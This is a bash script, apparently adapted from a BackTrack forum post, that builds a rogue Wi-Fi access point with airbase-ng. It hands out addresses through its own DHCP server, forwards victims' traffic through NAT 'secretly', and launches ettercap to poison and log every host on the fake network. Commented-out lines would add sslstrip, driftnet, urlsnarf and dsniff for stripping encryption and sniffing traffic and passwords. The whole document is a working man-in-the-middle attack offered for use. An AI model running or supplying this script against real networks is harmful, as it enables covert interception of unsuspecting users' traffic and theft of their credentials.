#----------------------------------------------------------------------#
# This script is what I have taken from a script I found on the old BT
# forums by Deathray. I modified it to fit my needs. -l3g10n
#----------------------------------------------------------------------#

# kill all dchp, collection, and processing software
killall -9 dhcpd3 airbase-ng ettercap sslstrip driftnet urlsnarf tail
# Kill all dchp processes
kill `cat /var/run/dhcp3-server/dhcpd.pid`

read -p "Enter the name of the interface connected to the internet, for example eth0: " IFACE
airmon-ng
read -p "Enter your wireless interface name, for example wlan0: " WIFACE
read -p "Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: " ESSID
# Stop and bring down the wireless interface
airmon-ng stop $WIFACE
ifconfig $WIFACE down
# Start and put up the wireless interface
airmon-ng start $WIFACE
ifconfig $WIFACE up

# enable the tunneling module
modprobe tun

# Set up the fake access point
echo Airbase-ng is going to create our fake AP with the SSID we specified
  # Open airbase thing in new terminal
xterm -bg black -fg yellow -e airbase-ng -e "$ESSID" -P -C 30 -v mon0  &

# Keep the program from stumbling over itself
sleep 10

echo Configuring interface created by airdrop-ng
# Put up and instantiate the tap interface at0 created by airbase
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1


echo 'Setting up iptables to handle traffic seen by the airdrop-ng (at0) interface'
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
# set up new ip forwarding tables in MASQUERADE mode - forward all the things...  secretly
iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE

# set up dhcp rules to forward all the things, using self as the router.
echo Creating a dhcpd.conf to assign addresses to clients that connect to us
echo "default-lease-time 600;" > dhcpd.conf
echo "max-lease-time 720;" >> dhcpd.conf
echo "ddns-update-style none;" >> dhcpd.conf
echo "authoritative;" >> dhcpd.conf
echo "log-facility local7;" >> dhcpd.conf
echo "subnet 10.0.0.0 netmask 255.255.255.0 {" >> dhcpd.conf
echo "range 10.0.0.100 10.0.0.254;" >> dhcpd.conf
echo "option routers 10.0.0.1;" >> dhcpd.conf
echo "option domain-name-servers 8.8.8.8;" >> dhcpd.conf
echo "}" >> dhcpd.conf

# Begin the DCHP server using the modified redirect config file
echo 'DHCP server starting on our airdrop-ng interface (at0)'
dhcpd3 -f -cf dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0 &
echo "Launching DMESG"
xterm -e tail -f /var/log/messages &
echo "Launching ettercap, poisoning all hosts on the at0 interface's subnet"
xterm -e ettercap -T -q -p -l ettercap$(date +%F-%H%M).log -i at0 // // &
sleep 8

# Ensure IP forwarding is enabled
echo 'Configuring ip forwarding'
echo "1" > /proc/sys/net/ipv4/ip_forward

echo 'Launching various tools'
#xterm -e sslstrip -a -k -f &
#driftnet -v -i at0 &
#xterm -e urlsnarf -i at0 &
#xterm -e dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log & 
